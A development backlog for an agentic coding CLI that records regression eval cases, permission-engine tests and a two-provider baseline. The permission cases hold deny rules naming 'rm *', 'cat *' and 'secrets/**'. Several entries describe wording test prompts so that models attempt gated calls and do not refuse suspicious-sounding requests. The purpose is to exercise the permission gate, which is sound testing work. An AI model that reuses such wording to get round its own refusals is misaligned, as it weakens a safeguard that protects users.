# Backlog

Forja progress diary. Entries in reverse chronological order (newest on top).

Format:

```
## [YYYY-MM-DD] <milestone>/<step> — <title>

**Done:** ...
**Decisions:** ...
**Pending:** ...
**Next:** ...
```

---

## [2026-04-28] M3 / Step 1.6 — Regression real-model baseline (closes Step 1)

Closes M3 / Step 1 by running the 35-case regression suite
against Anthropic Haiku 4.5 and OpenAI gpt-4o-mini, 3 rounds
each, and producing the parity matrix. Surfaces two
authoring bugs (cases 28 and 29) and four model-capability
divergences on gpt-4o-mini that we explicitly choose to
preserve rather than paper over.

**Why this slice closes Step 1:**

- Step 1.4 (parity matrix) was folded in here when Gemini
  was deferred. With two providers in scope, the
  measurement task IS the parity matrix.
- Step 1 originally targeted "~100 cases." We landed 35.
  Going broader without first proving the suite is stable
  would compound any structural issue (case design, prompt
  framing, expectation scope) across more cases. 35 with
  the parity matrix is the right exit criterion: enough
  surface to be load-bearing, small enough to fix in flight.

**Done — baseline matrix:**

| Provider | Model | Rounds | Pass rate | Total cost | Wall clock | p50 cost/case |
|---|---|---|---|---|---|---|
| Anthropic | Haiku 4.5 | 3 | 105/105 (100%) | $0.7994 | 11.4 min | $0.0042 |
| OpenAI | gpt-4o-mini | 3 | 91/105 (86.7%) | $0.0818 | 8.8 min | $0.0002 |

**Cost ratio: 9.8× cheaper on gpt-4o-mini, with 13.3pp
lower pass rate.** The same dynamic the smoke baseline
recorded (Step 6.3: $0.0050 vs $0.0002 p50, both 100%
on smoke) — at regression depth, the cost gap holds but
the pass rate gap appears.

**Authoring fixes applied DURING the baseline run:**

Smoke-check round (1 round Haiku) before the full baseline
caught two cases that were reliable on Haiku 4.5 but had
expectation/budget issues:

- **Case 28** (`plan-mode-multi-tool-readonly-chain`):
  `status: exhausted` because `maxSteps: 6` was tight
  for grep + read + plan-markdown emission. Bumped to
  `maxSteps: 8`. Strictly more permissive — cannot break
  any other case.
- **Case 29** (`plan-and-policy-coexist`): asserted
  `output_contains: "# Plan"` after a policy-denied
  bash call. Model correctly attempted bash → got
  denied → reported the denial → did NOT emit a plan
  markdown afterward. The case's core invariant is the
  gate-stack composition (`tool_denied: bash` after
  plan-gate let it through). Plan-markdown emission
  was over-broad assertion outside the case's scope.
  Dropped that one assertion. Strictly weaker — cannot
  break what was passing.

Both fixes re-verified on Haiku (35/35 second
smoke-check) before the 3-round baseline kicked off.

**gpt-4o-mini divergences (per-case stability):**

| # | Case | Stability | Diagnosis |
|---|---|---|---|
| 12 | glob → read first match | 0/3 | gpt-4o-mini calls glob and stops — interprets the file list as the answer rather than chaining into read_file |
| 23 | compaction multi-round | 0/3 | Hits `maxSteps: 14` budget. gpt-4o-mini takes more steps than Haiku for the same 10-read sequence. Even with `--timeout-ms 180000` (validated separately), still exhausts. Different completion strategy, not a wall-clock issue |
| 28 | plan + multi-tool readonly chain | 0/3 | Same family as #12: calls grep, never read_file. `status: error` |
| 30 | grep → edit | 0/3 | Same family: calls grep, never edit_file |
| 5 | edit_file disambiguation | 2/3 | Round 2 the model called write_file instead of edit_file, even with the file already existing. Flaky |
| 25 | compaction preserve_tail=0 | 1/3 | Rounds 1+2 picked wrong tools (glob/grep instead of read_file). Round 3 worked. Inconsistent prompt interpretation |

Pattern: 4 of 6 failures are "gpt-4o-mini calls one tool
of a multi-tool chain and stops." Case 23 is a different
family (more-steps-than-Haiku for the same work). Case 5
is rare flake.

**Decisions:**

- **Cases 12, 28, 30, 23 stay in the suite — no prompt
  gaming.** Step 6.5 explicitly documented: "If the
  case fails reliably on one provider but passes on
  another, that's a model capability divergence, not a
  harness bug — record it in the parity matrix and
  accept it." Strengthening prompts ("YOU MUST CALL X
  THEN Y") to satisfy the weaker model would game the
  test, hide the real model gap, and create false
  confidence. The cases capture real coverage on
  Haiku 4.5 and any future stronger model. They will
  light up red on gpt-4o-mini as expected and that's
  diagnostic, not a bug.
- **Provider-aware threshold becomes the gate model.**
  CI gate (deferred per `docs/TODO.md`) cannot use a
  flat 100%-pass threshold across providers. Two
  options:
  1. Per-provider thresholds: 100% on Haiku, ≥85% on
     gpt-4o-mini.
  2. Provider-agnostic core suite + provider-specific
     extension cases: cases known to be model-strength
     dependent live in a sibling tier
     (`evals/regression-frontier/`?).
  Option 2 is conceptually cleaner; option 1 ships
  faster. Defer the choice to when CI gate is
  actually being wired (it's not blocking M3 progress).
- **Case 23's `maxSteps: 14` stays.** Bumping to 20+
  to satisfy gpt-4o-mini would let the case pass on
  any provider regardless of efficiency. The point of
  step budgets is exactly to detect inefficient
  completion paths. Same model-capability-disclosure
  argument.
- **No new harness features required.** Confirmed
  during the run that everything we need is already
  there: NDJSON output, per-case aggregates, variance
  reporting. The only operational improvement is a
  `--timeout-ms` flag that already exists; using it
  per-provider in baseline runs is a doc convention,
  not a code change.

**Cut (kept the close tight):**

- **No live re-categorization of cases into tiers.**
  Sliding cases 12, 23, 28, 30 into a "frontier-only"
  tier today would require both a directory move AND a
  decision on the per-provider gate semantics. Both
  defer to CI-gate work (TODO.md). Today the cases
  stay in `evals/regression/` and the parity matrix
  documents the divergence.
- **No expansion to ~100 cases.** The original Step 1
  target. Reaching 100 means scaling each batch by ~3×.
  Lesson learned in 1.6: scaling cases without
  scaling provider coverage means accumulating
  Haiku-only coverage. Better to scale providers
  next (e.g., add Sonnet 4.6 to the parity matrix —
  cheap, faster, and validates the Anthropic family
  more thoroughly) before adding more cases.
- **No real-model run for case 23 with bumped
  maxSteps.** Validated separately at maxSteps:14 +
  timeout 180s — still exhausts on gpt-4o-mini. The
  capability gap is real, not a budget artifact.

**Pending (M3 next steps after Step 1):**

- M3 Step 2: pick the next subsystem from the M3
  scope: subagents, MCP, checkpoints+`/undo`,
  `bash_background`, `todo_write`, or Repo Map
  (tree-sitter). Priorities driven by which one
  blocks the most downstream work.
- Per-provider CI gate decision, when CI work
  resumes from `docs/TODO.md`.
- Case-tier resolution for divergent cases (option 1
  vs option 2 above) when CI gate lands.

**Risks documented:**

- **Haiku-only suites accumulate silently.** Today
  every regression case was authored against Haiku
  observability. Future cases written without a
  cross-provider sanity check will pile on more
  Haiku-only coverage. Mitigation: every new batch
  should run a 1-round gpt-4o-mini smoke check before
  closing the batch — the cost is trivial ($0.05 per
  35-case round).
- **gpt-4o-mini's chain-stopping pattern may
  generalize.** Cases 12, 28, 30 all fail on the
  same primitive: chain second-tool dispatch. If a
  future user runs Forja against gpt-4o-mini for a
  real workflow that depends on chained tool calls,
  they'll hit the same wall — and we'd rather they
  hit it in our regression suite than in production.
  The 0/3 result is the operator-facing signal:
  "this provider+model combination is not chain-safe
  on tool sequences."
- **The cost gap (9.8×) understates the value gap.**
  Pass rate adjusted: Haiku 4.5 effective cost per
  passed case ≈ $0.0076/case; gpt-4o-mini ≈ $0.0009/
  case but only 86.7% reliable. Quality-weighted, the
  ratio narrows substantially. This nuance belongs in
  M7 (hybrid profile) cost modeling — flagged here so
  the spec PR doesn't quote the raw 9.8× number.

**Spec reference:** `AGENTIC_CLI.md §16` (eval tiers,
golden traces), `PROVIDERS.md §7` (multi-model
first-class), `src/evals/cli.ts` (`--timeout-ms` flag).

---

## [2026-04-28] M3 / Step 1.5 — Regression batch 4: multi-tool flows

Continues M3 / Step 1 with batch 4 — 6 cases that
exercise multi-tool sequences and parallel dispatch. Total
in `evals/regression/` is now 35.

**Step 1.4 collapsed.** The original plan called Step 1.4
"provider adapter parity matrix" (re-run a subset under
OpenAI and Gemini). With Gemini deferred indefinitely
(see `docs/TODO.md`), and with the regression cases being
provider-agnostic by construction (the runner accepts
`--model` for any registered provider), the parity
"matrix" reduces to "run the suite under Anthropic, then
under OpenAI." That's a measurement task, not an authoring
task — it folds into Step 1.6 where we produce the real-
model baseline. Skipping 1.4 doesn't drop coverage; it
recognizes the work was always going to happen under a
different name.

**Why multi-tool flows matter:**

- Real workflows chain tools. Smoke and batches 1-3 are
  largely single-tool: each case proves "tool X works
  for behavior Y." Multi-tool exercises the seam — the
  tool_result of call N flows into the args of call N+1.
- Parallel dispatch (multiple tool_use blocks in one
  assistant turn) is a provider-adapter concern.
  Step 6.3 noted this "behaved correctly" for both
  Anthropic and OpenAI under smoke, but smoke never
  forces parallel dispatch — case 34 does.
- Edit-after-read is the modal refactor pattern; if it
  silently regressed, every code-modifying workflow
  would break and smoke would still pass.

**Done — cases 30-35:**

| # | Flow | Why this case |
|---|---|---|
| 30 | grep → edit_file | Find-and-fix workflow. Asserts the matched file is the one mutated, AND that edit_file (not write_file) was used — preserves the in-place semantics |
| 31 | read_file → write_file (derived) | Data-transformation pattern: read input.json, sum its array, write output.json. Asserts input is preserved verbatim, output contains the derived value |
| 32 | read_file → edit_file (same file) | Read-then-modify-based-on-contents: read version.txt (`41`), edit to `42`. The model's edit_file `old_string` must be derived from the prior read result. Catches a regression where tool_result content fails to round-trip into subsequent tool args |
| 33 | glob → edit_file (one of N) | File-selection-then-mutation: glob finds 3 TS files; edit only `alpha.ts`; assert the other two are unchanged. Three negative `file_contains` assertions — the most defensive case in the batch |
| 34 | parallel tool_use (3 reads, 1 turn) | Explicit instruction to dispatch all three read_file calls in a SINGLE assistant turn. Provider adapters serialize parallel tool_use differently (Anthropic emits multiple tool_use blocks per content array; OpenAI emits a tool_calls array) — this case is the regression net for that adapter logic |
| 35 | glob → read ×N → write_file | 3-step chain. Glob finds 3 TS files, reads each, writes summary.txt with derived data (function return values per file). Asserts depth: 2-step works in cases 30-34, this proves 3-step composes |

**Cut (out of scope for this batch):**

- **No grep → write_file case.** Would test the same
  "tool A drives tool B" axis as case 30 with a
  weaker assertion (write creates new files; edit
  asserts the IN-PLACE constraint). Case 30 is
  strictly stronger.
- **No bash → file-tool chains.** Bash output as input
  to read_file is somewhat implicit in case 35
  (glob → read), and bash → write would test
  composition that's already covered by case 31's
  read → write pattern. Diminishing returns.
- **No 4-step chains.** If 3-step works, 4-step
  failing would be a budget issue
  (`maxSteps`/`maxToolErrors`), not a composition
  issue. Cases 35's 10-step budget already gives the
  model headroom; deeper chains pay for themselves
  only when concrete bugs appear.

**Decisions:**

- **Case 31 uses `[10, 20, 30, 40]` summing to 100.**
  Picked deliberately: `100` is short enough for
  `output_contains` to be unambiguous (no ambient `100`
  in the prompt or fixture), and the math is trivial
  enough that arithmetic errors aren't a model-skill
  test. If a model can't sum 4 small integers, it has
  bigger problems than the harness.
- **Case 32's `41 → 42` is intentional.** `42` is
  unique in the fixture (input is `41`, no other 42s
  exist anywhere in setup). The increment is the
  smallest-possible derived computation — same
  philosophy as case 31, isolating the harness from
  model arithmetic skill.
- **Case 33 asserts unchanged files explicitly.** Three
  separate `file_contains` assertions on the
  not-edited files. Slight assertion bloat but worth
  it: a regression where the model edits the WRONG
  file (e.g., picks delta.ts because of alphabetical
  confusion) would otherwise pass — assertion on the
  target alone wouldn't catch the collateral mutation.
- **Case 34 trusts the model on parallel dispatch.**
  The prompt is explicit ("emit all three read_file
  calls in a SINGLE assistant turn"). If a provider
  adapter regresses — say, splits parallel tool_use
  into sequential calls under the hood — the case
  still passes (3 sequential reads also yields the
  three colors in output). This case proves the
  end-to-end semantics, not the wire-level dispatch
  shape. The wire-level test is in unit coverage
  (`tests/providers/*-stream.test.ts`).

**Pending (Step 1.6):**

- Real-model baseline run across the full 35-case
  suite under Anthropic (Haiku 4.5) and OpenAI
  (gpt-4o-mini), 3 rounds each. Decisions to make at
  that point:
  1. Cost envelope: 35 × ~$0.005 × 3 = ~$0.50 per
     provider per baseline. Acceptable.
  2. Wall-clock: 35 × ~5s × 3 ≈ 8min serial — close
     to the spec target (<10min). Parallelism still
     deferred unless this exceeds.
  3. Drop list: any case that fails reliably across
     rounds for model-behavior reasons (not harness
     bugs) gets pulled per the Step 6.5 honesty pass.

**Risks documented:**

- **Case 34 may not actually parallel-dispatch.**
  Models sometimes ignore the "single turn" hint and
  serialize anyway, especially smaller ones. The
  case still passes via the output assertions
  (sequential reads also produce all three colors),
  but the test is silently weaker than intended. If
  we want to force parallel dispatch as a hard
  invariant, we'd need a new `parallel_tool_use`
  expectation kind that asserts ≥2 tool_use blocks
  appeared in a single assistant message. Tracked
  here, not implemented — adding the expectation
  kind is a §1.7+ harness change.
- **Case 35's three-step chain is the longest in
  the suite.** If the model halts after step 2
  ("here's the data" without writing), the case
  fails on `file_exists: summary.txt`. The prompt
  is explicit about all three steps with numbered
  instructions; further hand-holding would feel
  test-gaming. If the case flakes, the right fix is
  at the suite-level summary (mark as flaky in the
  parity matrix) rather than rephrasing.
- **Case 33's negative assertions can mask reads.**
  `file_contains: src/beta/beta.ts pattern: return 2;`
  passes IF the file is unchanged OR if the model
  rewrote the file with the same content. Highly
  unlikely in practice, but flagging the assertion
  pattern: `file_contains` is presence, not absence
  of mutation. Only `tool_not_called: edit_file`
  would catch a no-op edit, but cases 30/32/33 all
  *want* edit_file to be called once. We accept
  this gap — a model that no-op-edits the wrong
  file is a regression class smoke wouldn't catch
  either.

**Spec reference:** `AGENTIC_CLI.md §7` (tool system),
`§7.1` (tools v1), `PROVIDERS.md` (parallel tool_use
adapter contract), `src/providers/*-stream.ts`
(per-provider parallel-dispatch normalization).

---

## [2026-04-28] M3 / Step 1.3 — Regression batch 3: compaction + plan mode

Continues M3 / Step 1 with batch 3 — 7 cases that
exercise compaction edge cases, plan-mode harness gates,
and the plan/policy gate composition. Total in
`evals/regression/` is now 29.

**Why this slice next:**

- Smoke covers ONE compaction (case 08, `min_count: 1`,
  `strategy: llm`). It does not cover: multiple
  compactions in a single run, the goal-reinjection
  layer's correctness, `preserveTail: 0` (most-aggressive
  fold), or compaction under `--plan`. Each is a real
  failure mode in the spec (`AGENTIC_CLI §6.1`,
  `CONTEXT_TUNING §3`).
- Plan mode smoke covers write_file blocking (case 05).
  edit_file uses a different harness code path
  (`invoke-tool.ts:175-195`); a regression there would
  pass smoke and ship broken. Edge case is worth a
  dedicated case.
- The plan/policy interaction has zero coverage outside
  unit tests. Subagents will extend the gate stack
  (sandbox, then plan, then policy, then hooks); pinning
  the existing two-layer composition NOW means future
  layer additions have a known-good baseline to compare
  against.

**Done — cases 23-29:**

| # | Subsystem | Why this case |
|---|---|---|
| 23 | compaction multi-round | `min_count: 2` — fixture forces ≥2 compactions by re-reading the chunky-modules tree twice. Catches a regression where the second compaction silently no-ops or deadlocks |
| 24 | compaction preserves goal | Embeds literal token `MARKER_24_GOAL_KEPT` in the prompt; asserts it survives in final output despite compaction firing. Tests the goal-reinjection layer (`compact*.ts:240-242` "subsequent compactions must see the ORIGINAL goal") under load |
| 25 | `preserveTail: 0` | Most-aggressive fold: every middle turn becomes summary, no literal tail preserved. Asserts the run still completes to `status: done` and reports the verbatim dependency. Catches a regression where preserve_tail=0 trips the alignment-shift edge (`loop.ts:482-484` `+ 2` accounting) |
| 26 | compaction under `--plan` | 4-axis intersection: plan + read_file ×5 + compaction triggered + plan markdown emitted. Catches regressions where compaction's LLM call somehow trips the plan-mode write gate (it shouldn't — different layer — but composition is exactly the kind of thing that breaks silently) |
| 27 | plan blocks edit_file | Symmetric with smoke 05 on the edit_file path. Different harness code (`invoke-tool.ts` plan-gate predicate), different deny message. Asserts greeting.txt content unchanged after the run |
| 28 | plan + multi-tool read-only chain | grep → read_file chain in plan mode, both pass plan-gate, plan markdown emitted. Negative side: write_file/edit_file not called. Documents that read tools chain freely under plan; the gate is precisely targeted at writes |
| 29 | plan + policy compose | The big one: plan: true + bash with read_only:true + policy `bash.deny: ['cat *']`. Plan-gate sees read_only and lets it pass; policy deny then fires. Asserts `tool_denied: bash` AND plan markdown present AND fixture file unchanged. Catches any regression where one gate silently swallows the other's decision |

**Cut (kept the slice tight):**

- **No `strategy: fallback` case.** Forcing the
  compaction LLM call to fail requires either provider
  fault injection (no surface today) or an unreachable
  network. Mock providers cover this in unit tests
  (`tests/harness/compact*.test.ts`); a real-model case
  would either flake on transient errors or never
  trigger the fallback path. `tool_denied`-style
  rigor: keep harness-internal behavior in unit tests;
  reserve regression for "model + harness end-to-end."
- **No `compaction-skipped` case.** When prompt
  doesn't exceed threshold, no compaction event fires.
  Asserting "no compaction" via absence is weaker than
  asserting presence, and the existing 8 cases without
  compaction triggers already implicitly exercise this
  path (they pass without firing compaction). Skipped
  is the default; default doesn't need a dedicated
  case.
- **No multi-strategy-mix case.** A run where
  compaction round 1 succeeds with `llm` and round 2
  falls back to `fallback` would be the highest-value
  test of the strategy field — but again, requires
  fault injection. Deferred to whenever the harness
  grows a strategy-override env var (`CONTEXT_TUNING`
  open question).

**Decisions:**

- **Fixture reuse over fixture proliferation.** Cases
  23, 24, 25, 26 all consume `chunky-modules`. The
  fixture was sized for one compaction; lowering
  `compactionThreshold` to 0.01 in case 23 forces two
  without changing the fixture. Ad-hoc threshold
  tuning per case keeps fixtures stable.
- **`MARKER_24_GOAL_KEPT` is intentionally weird.** The
  compactor's LLM-summarization step gets a goal that
  contains an explicit "must be honored in your FINAL
  message" instruction. If the summary correctly
  preserves the goal, the marker re-enters the
  context and the model echoes it. If the summary
  paraphrases the goal away (regression), the model
  has no source for the marker. The token's
  uniqueness (`MARKER_24_GOAL_KEPT` is a literal not
  found in any fixture or system prompt) means a hit
  on `output_contains` cannot come from anywhere
  else.
- **Case 29 frames the policy denial as expected.**
  The prompt explicitly says "the policy layer is a
  separate gate — it may block the command for its
  own reasons." Same Step 6.5 mitigation: model has
  permission to attempt the call (so policy gets to
  fire), and the prompt won't trip preemption
  defenses by sounding malicious.

**Pending (Step 1.4 onward):**

- 1.4: provider adapter parity matrix — re-run a
  selected subset of batches 1-3 under OpenAI and
  Gemini (when smoke unblocks), publish the matrix.
- 1.5: multi-tool flows (grep→edit, glob→write,
  bash→edit). Cross-tool sequences not yet tested.
- 1.6: real-model baseline across full ~100-case
  suite, 3 rounds, decide on parallelism.

**Risks documented:**

- **Case 23 budget tight at maxSteps: 14.** Reading
  10 files (5 × 2) plus model thinking turns may
  bump against the cap. If the case starts failing
  with `exhausted` instead of `done`, raise to 16.
  Tracked here so future debugging starts at the
  right knob.
- **Case 24 depends on instruction-following AND
  goal preservation.** Two failure modes that a
  single failed run can't distinguish:
  - Goal got dropped by the summarizer (harness
    bug) — the fix is in `compact*.ts`.
  - Goal preserved but model ignored the marker
    instruction (model bug) — drop the case.
  When this case starts failing, the next-step
  diagnosis is to read the audit log: did the
  post-compaction message stack contain
  `MARKER_24_GOAL_KEPT`? If yes, model-side; if no,
  harness-side. Documented here so the bisection
  is a transcript-read, not a binary search through
  prompt rewording.
- **Case 25's `preserveTail: 0` may break some
  models.** Without literal tail, the model relies
  entirely on its own summary of intent. Smaller
  models (gpt-4o-mini in our smoke set) may lose
  track of where they were in the sequence. If the
  case fails reliably on one provider but passes on
  another, that's a model capability divergence,
  not a harness bug — record it in the parity
  matrix (Step 1.4) and accept it.

**Spec reference:** `AGENTIC_CLI.md §5` (plan mode),
`§6.1` (compaction), `CONTEXT_TUNING.md §3` (preserve
parameters), `src/harness/compact*.ts` (goal preservation
implementation).

---

## [2026-04-28] M3 / Step 1.2 — Regression batch 2: permission engine

Continues M3 / Step 1.1 with batch 2 — 10 cases that
exercise the permission engine surface (`src/permissions/
engine.ts`). Each case ships its own
`.agent/permissions.yaml` via `setup.files`, which the eval
executor wires up automatically (`src/evals/executor.ts`
drops a default `bypass` policy only when the case+fixture
didn't provide one — see lines 108-115).

**Why permissions next:**

- Smoke runs entirely in default `bypass`. The engine has
  unit coverage but never round-tripped under load with a
  real model emitting tool calls under deny rules. M2's
  smoke proves "the model uses tools"; this proves "the
  model handles being told no."
- The engine is the surface that subagents (M3 next),
  MCP (M3+), and hooks (M4) layer on top of. Catching
  regressions here BEFORE those subsystems land means we
  know any future deny-class bug is in the layer above,
  not below.

**Done — cases 13-22 (numbered to extend batch 1):**

| # | Engine surface | Why this case |
|---|---|---|
| 13 | `defaults.mode: strict` + no rules → default deny | Bedrock invariant: empty strict = nothing allowed. Asserts `tool_denied` after the model tries — proves the gate fires, not just that the model preempted |
| 14 | `confirm_paths` + no UI → silent deny | Documents the M1-era behavior (`invoke-tool.ts:235-251`): confirm becomes `confirm_no` when no operator. Uses `file_not_exists` instead of `tool_denied` because the engine emits `kind: confirm`, not `deny` — cleanly distinguishes the two paths |
| 15 | `bash.allow` matches → allow | Positive case: the rule actually permits when intended. `echo *` with `read_only: true` |
| 16 | `bash.deny` wins over `bash.allow` | Asserts the deny-precedence invariant from `engine.ts:90-95` — gives the model BOTH `allow: ['*']` and `deny: ['rm *']`, expects `rm` denied |
| 17 | `write_file.deny_paths` blocks under `acceptEdits` | Confirms deny_paths fires even under acceptEdits (the most permissive non-bypass mode). `secrets/**` blocked despite `allow_paths: ['**']` |
| 18 | `write_file.allow_paths` permits under strict | Positive path-rule case: `*.md` allows `notes.md`. Mirror of #20 |
| 19 | `read_file.deny_paths` blocks reads | Symmetric with #17 for the read axis. Catches any future regression where deny_paths is silently treated as write-only |
| 20 | strict + write outside allow_paths → deny | Negative path-rule case: `*.md` rule does NOT cover `data.json`. Default deny under strict |
| 21 | acceptEdits + no rule → still deny | The single most likely confusion vector for users: "acceptEdits" sounds like "allow all edits". It's not — it auto-accepts `confirm_paths` matches but unmatched paths still deny (`engine.ts:172-175`). This case proves the engine matches the JSDoc |
| 22 | `bypass` short-circuits even deny rules | `engine.ts:221-223` returns `allow` before any rule runs. Asserts that adding a deny rule to a bypass policy is a no-op — important for operators who think they're "hardening" bypass with selective denies |

**Cut (bounded scope):**

- **No `confirm` decision via `tool_denied`.** The
  `tool_denied` expectation fires only on `kind: 'deny'`
  per `executor.ts:137-141`. Confirm decisions emit
  `kind: 'confirm'` and the harness layer turns them
  into `confirm_no` errors. Case 14 routes around this
  by asserting on `file_not_exists` directly. Adding
  a `tool_confirmed` expectation kind was considered
  and rejected — the existing surface is enough; one
  more discriminant would be paid for thinly until
  the M2 confirm-UI lands.
- **No FetchPolicy cases.** `web.fetch` is the engine
  category, but no `fetch_url` tool exists yet — the
  builtin tool surface stops at the 6 from M1. Coverage
  arrives when the tool does, not before.
- **No hierarchy cases (enterprise / user / project /
  session).** `src/permissions/hierarchy.ts` resolves
  layered policies, but eval cases ship a single
  `.agent/permissions.yaml` (the project layer). Real
  hierarchy testing needs multi-file fixtures and
  potentially HOME/XDG override surfaces — out of
  scope for batch 2, comes back when subagents start
  using the session layer.

**Decisions:**

- **Phrase prompts so the model attempts the call.**
  Step 6.5's lesson cuts here too: aligned models
  preempt suspicious requests. For deny-class cases
  (13, 16, 17, 19, 20, 21) the prompt explicitly says
  "report whatever the tool returns, even if it's a
  denial — do NOT switch tools, do NOT retry." The
  model needs to invoke the gated tool for the engine
  to deny it; if it preempts, `tool_denied` fails
  vacuously. Mitigation: model has no policy
  visibility (verified — policy doesn't leak into
  system prompt; checked `harness/loop.ts:206`), so it
  attempts naturally unless something in the prompt
  itself looks dangerous.
- **`acceptEdits` confusion gets its own case (#21).**
  This is the only spec-§8 nuance ("aceita edits sem
  confirmação") that consistently surprises operators
  reading the policy file. Ship it as a regression
  pinning the documented behavior so any future
  refactor that loosens it lights up red.
- **Loader-level guarantees re-validated implicitly.**
  Each `.agent/permissions.yaml` shipped via
  `setup.files` round-trips through
  `loadPolicyFromFile` at engine construction. A
  YAML key typo (`allow_path` singular) would crash
  the case at load time with the policy parser's
  rejection message — so these cases also prove the
  policy parser stays strict-but-tolerant under load.

**Pending (Step 1.3 onward):**

- Compaction edge cases: preserve-tail boundaries,
  fallback strategy when LLM call fails, multiple
  compactions in one run.
- Plan mode + multi-tool interleaving (plan + bash +
  edit attempt).
- Cross-cutting: bash deny when plan mode also active
  (which gate fires first?).

**Risks documented:**

- **Cases 13, 16, 17, 19, 20, 21 depend on the model
  attempting the call.** Same vector that bit Step 6.5.
  Mitigation in prompt phrasing above. Worst case: a
  case fails 0/3 because the model preempted on every
  round. The right response then is to drop the case
  (per the Step 6.5 honesty pass), not to tweak the
  prompt until it works — model-behavior tests vs
  harness-behavior tests stay separated.
- **Path glob semantics use `**` literally.** YAML
  parsers can be subtle about `**` inside flow scalars;
  block scalars (used here) sidestep the issue. If a
  future case writes the policy inline as a flow scalar
  and `**` interacts with anchors/aliases, the rule
  silently doesn't match. Pin the convention: always
  block-scalar policy YAMLs in `setup.files`.

**Spec reference:** `AGENTIC_CLI.md §8` (permission
engine), `§9` (trust & safety), `src/permissions/engine.ts`
(deny-precedence and bypass-shortcircuit invariants).

---

## [2026-04-28] M3 / Step 1.1 — Regression tier scaffold + first batch

Opens M3 by attacking the spec §16 mandate "regression
(~100 cases, < 10min) — todo PR" before subsystems that
will lean on it (subagents, MCP, checkpoints). Step 1.1 is
the first slice: scaffold `evals/regression/` and land a
first batch (~12-15) of cases that exercise tool surface
edge cases the smoke tier intentionally skips.

**Why this slice first:**

- The harness already supports any directory under
  `evals/`. Runner is uncoupled from naming convention
  beyond `*.yaml` extension (verified in `src/evals/cli.ts`
  `discoverCases`). So a regression tier needs no
  harness changes for the simplest path — just YAML.
- Subagents, MCP, checkpoints (the rest of M3) all add
  surfaces that need regression coverage. Building the
  tier *first* means those subsystems get born with a
  net under them, instead of retrofitting tests after
  the fact.
- Regression as a TIER also unlocks the CI gate item in
  `docs/TODO.md` once it stabilizes.

**Plan (stepwise):**

- 1.1 — scaffold + tool-depth batch (~12-15 cases). This
  entry.
- 1.2 — permission engine cases (deny/allow/ask hierarchy
  edges, `.agent/permissions.yaml` glob matching, prefix
  rules).
- 1.3 — compaction + plan mode edge cases (preserve-tail
  boundaries, fallback strategy when LLM call fails,
  plan mode + multi-tool interleaving).
- 1.4 — provider adapter parity matrix (same case across
  Anthropic / OpenAI / Gemini once Gemini smoke unblocks).
- 1.5 — multi-tool flows (glob→read, grep→edit, bash→write).

**Decisions to make explicit upfront:**

- **No real-model baseline run inside Step 1.1.** Writing
  cases and confirming they parse is one unit; running
  them against a paid provider is another. Cost
  envelope per real-model run scales with case count
  (15 cases × $0.005 ≈ $0.075/round; 100 cases × 3
  rounds ≈ $1.50). Real-model baseline lands in Step 1.6
  after the 5 batches stabilize, so the cost is paid
  once on a complete suite instead of paid 5 times on
  intermediate states.
- **Cases stay deterministic-by-design.** Avoid
  expectations that depend on model-specific phrasing
  (the Step 6.3 lesson: `output_contains: "hello world"`
  was a property of Haiku, not the harness). Prefer
  tool-call invariants (`tool_called`, `file_contains`,
  `file_exists`, `tool_denied`).
- **No new harness features in 1.1.** Parallelism (to
  hit the < 10min target with 100 cases) is a separate
  step. Today, regression runs serial like smoke.

**Spec reference:** `AGENTIC_CLI.md §16` (eval tiers),
`PROVIDERS.md §7` (multi-model first-class).

**Done:**

- New tier directory `evals/regression/` born with its
  first 12 cases. No `.gitkeep`, no README — the
  directory is created by the YAMLs themselves, mirroring
  the project rule that empty folders are noise.
- Cases (numbered for stable ordering, not for
  dependency):

  | # | Subsystem under test | Insight beyond smoke |
  |---|---|---|
  | 01 | `read_file` offset/limit | smoke reads whole file; this proves the line-window args round-trip through tool dispatch |
  | 02 | `read_file` missing path | error path; model must NOT fall back to write_file |
  | 03 | `write_file` deep nested dir | smoke writes at root; this proves intermediate dir creation |
  | 04 | `write_file` overwrite | smoke creates new file; this proves stale content gets replaced |
  | 05 | `edit_file` disambiguation | exercises the ambiguity-fail path: model must use surrounding context to pick one of two identical substrings |
  | 06 | `edit_file` missing pattern | error path; model must NOT fall back to write_file |
  | 07 | `grep` zero matches | empty-result path; model must NOT invent matches or write files |
  | 08 | `grep` real regex | proves regex (not literal) interpretation: `function\s+\w+` finds 3 names |
  | 09 | `glob` deep nesting | `**/*.ts` walks 3 directory levels |
  | 10 | `glob` zero matches | empty-result path; symmetric with 07 for the file-discovery axis |
  | 11 | `bash` piped command | `wc -l < file` exercises shell redirection in plan-friendly mode |
  | 12 | multi-tool glob→read | proves tool-call chaining: glob output drives read_file path |

- New fixture `evals/fixtures/nested-tree/` carries the
  3-level TS tree used by cases 08, 09, and 12 (one
  fixture, three cases — keeps fixtures tight). Inline
  `setup.files` covers the 6 cases (01, 04, 05, 06, 11,
  and 03 implicitly via writes to a fresh workspace) where
  a one-liner file is enough — fixture dirs are reserved
  for trees with structure.
- All 12 YAMLs verified to load through
  `src/evals/loader.ts` without a single parse error.
  Loader-level invariants exercised:
  - inline `setup.files` paths (relative-only, no `..`)
  - `tool_called` / `tool_not_called` / `file_contains` /
    `file_exists` / `file_not_exists` / `output_contains`
    / `status` discriminants
  - YAML literal block (`|`) for multi-line file content
- `bun run typecheck`, `bun run lint`, and `bun test`
  all green (625 pass, 0 fail) — no source touched, no
  drift introduced.

**Cut (kept the slice tight):**

- **No README in `evals/regression/`.** CLAUDE.md
  prohibits unsolicited markdown docs; the convention is
  documented here in BACKLOG and self-evident in the
  YAMLs themselves. If a second contributor lands and
  asks "what goes in regression vs smoke?", that's the
  signal to write the README — pre-writing it would be
  speculative documentation.
- **No real-model baseline run.** Confirmed in the
  opening entry above — paying $0.30+ for a 12-case
  Haiku baseline today, then re-paying it after each of
  the 4 remaining batches lands, would cost ~$1.50
  unnecessarily. Single baseline run gates Step 1.6
  (closes the regression tier) instead.
- **No new harness features.** Considered adding a
  `--tier` shorthand (`bun run eval:regression`) but
  the existing CLI already accepts a directory arg, so
  `bun run eval -- evals/regression` works today. A
  shorthand is shoe-leather; deferred until the tier
  proves it deserves one.

**Decisions:**

- **Determinism over model-style assertions.** Every
  case asserts on harness-observable facts
  (`tool_called`, `file_contains`, `status: done`) plus
  at most a single `output_contains` fragment that's a
  literal echo of fixture content (e.g., `line three`,
  `alpha.ts`). No assertions on phrasing, sentence
  structure, or summarization style. This is the Step
  6.3 lesson applied at scale: provider divergence is
  guaranteed; we only assert on what the harness sees.
- **Negative tool calls (`tool_not_called`) earn their
  weight.** Cases 02, 06, 07, and 10 all pair the
